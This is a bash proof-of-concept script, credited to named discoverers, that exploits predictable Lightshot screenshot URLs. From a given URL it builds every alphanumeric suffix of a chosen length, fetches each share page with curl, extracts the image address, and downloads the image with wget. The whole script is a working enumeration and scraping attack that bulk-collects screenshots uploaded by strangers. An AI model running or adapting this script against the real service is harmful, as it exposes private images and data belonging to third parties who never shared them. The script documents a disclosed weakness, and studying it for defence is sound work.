#!/bin/bash

# Lightshot filename disclosure POC
# @Discovered by : Naïm GALLOUJ
# @Author : Charles SENGES

url=$1
row=$2

if (($# != 2)); then
	echo "2 arguments expected"
	exit 1;
fi

cuturl=$(echo $url | head -c -$(expr 1 + $row))
charset=({a..z} {0..9})
alphabet=""

echo "Downloading "$(echo "36 ^ $row" | bc)" images from $url ..."
echo ""

permute(){
  (($1 == 0)) && { alphabet=$alphabet" $2"; return; }
  for char in "${charset[@]}"
  do
    permute "$((${1} - 1 ))" "$2$char"
  done
}

permute "$row"

for a in $alphabet;	do
	curl -s $cuturl$a > tmp.html
 	wget -nv $(cat tmp.html | grep -o '<img class="image__pic js-image-pic" [ ]*src="[^"]*"' | cut -d '"' -f 4)
done